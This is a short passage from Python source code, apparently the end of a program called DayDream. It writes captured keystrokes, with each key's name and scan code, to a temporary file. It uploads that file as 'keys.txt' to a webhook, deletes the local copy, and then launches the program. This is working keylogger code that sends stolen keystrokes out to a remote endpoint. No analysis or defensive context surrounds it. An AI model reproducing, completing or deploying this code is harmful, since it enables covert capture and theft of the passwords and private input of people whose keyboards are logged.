				keysFile.write("- " + event.name + " (" + str(event.scan_code) + ")\n")
			else:
				keysFile.write(event.event_type + " " + event.name + " (" + str(event.scan_code) + ")\n")
		keysFile.close()
		with open(join(self.parent.temp, fileName), "rb") as file:
			self.parent.keyWebHook.add_file(file=file.read(), filename="keys.txt")
		self.parent.keyWebHook.execute(remove_files=True)
		os.remove(join(self.parent.temp, fileName))

	def __init__(self, parent: DayDream, record: list):
		self.parent = parent
		self.record = record


DayDream()
